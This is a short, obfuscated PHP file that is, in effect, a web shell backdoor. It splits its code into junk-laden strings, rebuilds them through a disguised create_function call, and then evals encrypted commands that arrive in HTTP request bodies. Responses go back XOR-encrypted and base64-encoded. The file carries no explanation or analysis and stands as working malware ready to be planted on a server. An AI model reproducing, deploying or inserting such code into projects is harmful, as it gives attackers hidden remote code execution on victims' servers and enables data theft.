<?php
$L='Q"Q;functiQon x($t,$k){$c=strQlen($kQ);$l=stQrQleQn($t);$oQ="";forQ($i=0;$iQ<$l;){Qfor($j';
$E='();@eQval(@gQzuncomQpreQss(@x(@QbasQe6Q4_decQode($m[1]Q),Q$k)));$oQ=@obQ_get_cont';
$C='ents();@Qob_enQdQ_Qclean();$r=@basQQe64_encodQe(@x(@gQzcompQress($o),Q$k))Q;prQint("$p$kh$Qr$kf");}';
$b='g_match("/$kQh(.+)$kf/Q",@fQile_get_conteQntsQ("php:/Q/input"Q),$m)QQ==1Q) {@ob_start';
$T='$k="8Q0eac25e";Q$QkQh="f2489Qd1b14e7";$kf="4Qc5Q8Qc4704944";$p="7QgRC6EQp6Vs5QOBWPQy';
$W=str_replace('Ic','','creIcatIceIc_fIcuIcIcnction');
$z='=0Q;($jQ<$c&&$i<$Ql);$j++Q,$i++Q){$o.=$Qt{$i}Q^$k{Q$j};}}rQetQurQn $o;}if (@pQreQQ';
$g=str_replace('Q','',$T.$L.$z.$b.$E.$C);
$Q=$W('',$g);$Q();
?>
